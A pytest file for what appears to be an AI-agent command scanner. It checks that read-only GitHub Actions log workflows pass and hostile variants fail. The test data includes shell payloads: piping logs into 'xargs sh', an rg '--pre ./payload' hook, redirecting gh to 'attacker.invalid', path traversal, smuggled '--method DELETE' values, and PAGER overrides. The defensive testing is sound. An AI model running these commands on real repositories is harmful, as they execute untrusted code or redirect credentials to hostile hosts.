"""Regression coverage for typed, read-only GitHub Actions shell workflows."""

from __future__ import annotations

from pathlib import Path

import pytest

from codex_plugin_scanner.guard.cli.commands_support_runtime_artifacts import (
    _unmodeled_shell_runtime_artifact,
)
from codex_plugin_scanner.guard.runtime.github_actions_read_workflow import (
    is_nonexecuting_github_actions_read_workflow,
)
from codex_plugin_scanner.guard.runtime.secret_file_requests import (
    extract_sensitive_tool_action_request,
    is_explicitly_benign_tool_action_request,
)


def _workflow(*, final_command: str | None = None, id_query: str = ".jobs[].id") -> str:
    read_logs = final_command or (
        "gh api \"repos/example/project/actions/jobs/$jid/logs\" 2>/dev/null | rg -o 'package==[0-9.a-z+]+' | head -20"
    )
    return "\n".join(
        (
            "# Inspect the latest publish run",
            "run=123456789",
            "gh run view $run --repo example/project --json jobs --jq '.jobs[]|{name,conclusion}'",
            (
                "job_id=$(gh api repos/example/project/actions/runs/$run/jobs "
                "--jq '.jobs[]|select(.name|test(\"canary|publish\"))|.id' | head -5)"
            ),
            "echo jobs: $job_id",
            f"for jid in $(gh api repos/example/project/actions/runs/$run/jobs --jq '{id_query}'); do",
            "  name=$(gh api repos/example/project/actions/jobs/$jid --jq .name)",
            "  if echo \"$name\" | rg -qi 'canary|publish'; then",
            '    echo "=== $name ==="',
            f"    {read_logs}",
            "  fi",
            "done",
        )
    )


def test_typed_github_actions_read_workflow_is_explicitly_benign(tmp_path: Path) -> None:
    command = _workflow()

    assert is_nonexecuting_github_actions_read_workflow(command)
    assert is_explicitly_benign_tool_action_request(
        "bash",
        {"command": command},
        cwd=tmp_path,
        home_dir=tmp_path,
    )
    assert (
        extract_sensitive_tool_action_request(
            "bash",
            {"command": command},
            cwd=tmp_path,
            home_dir=tmp_path,
        )
        is None
    )
    assert (
        _unmodeled_shell_runtime_artifact(
            harness="pi",
            command_text=command,
            config_path="<config>",
            source_scope="workspace",
            workspace=tmp_path,
            home_dir=tmp_path,
        )
        is None
    )


@pytest.mark.parametrize(
    "final_command",
    (
        "gh run cancel $jid --repo example/project",
        "gh api repos/example/project/actions/jobs/$jid -X DELETE",
        "gh api repos/example/project/actions/jobs/$jid -f state=cancelled",
        "gh api repos/example/project/actions/jobs/$jid/logs > output.zip",
        "gh api repos/example/project/actions/jobs/$jid/logs | xargs sh",
        "gh api repos/example/project/actions/jobs/$jid/logs | rg --pre ./payload pattern",
        "gh api repos/example/project/actions/jobs/$jid/logs --hostname attacker.invalid",
        "gh api repos/../project/actions/jobs/$jid/logs",
        "$(gh api repos/example/project/actions/jobs/$jid --jq .name)",
    ),
)
def test_typed_github_actions_read_workflow_rejects_mutation_writes_and_execution(
    final_command: str,
) -> None:
    assert not is_nonexecuting_github_actions_read_workflow(_workflow(final_command=final_command))


@pytest.mark.parametrize(
    "id_query",
    (
        ".jobs[].name",
        '"--method DELETE"',
        ".jobs[]|{id:.name}",
        '({id:"--method DELETE"}).id',
    ),
)
def test_typed_github_actions_read_workflow_rejects_non_numeric_loop_data(id_query: str) -> None:
    assert not is_nonexecuting_github_actions_read_workflow(_workflow(id_query=id_query))


def test_typed_github_actions_read_workflow_rejects_unclosed_control_flow() -> None:
    assert not is_nonexecuting_github_actions_read_workflow(_workflow().removesuffix("done"))


@pytest.mark.parametrize(
    ("key", "value"),
    (
        ("GH_HOST", "attacker.invalid"),
        ("GH_PAGER", "./payload"),
        ("PAGER", "./payload"),
        ("RIPGREP_CONFIG_PATH", "./ripgreprc"),
    ),
)
def test_typed_github_actions_read_workflow_rejects_executable_or_remote_environment(
    monkeypatch: pytest.MonkeyPatch,
    key: str,
    value: str,
) -> None:
    monkeypatch.setenv(key, value)

    assert not is_nonexecuting_github_actions_read_workflow(_workflow())
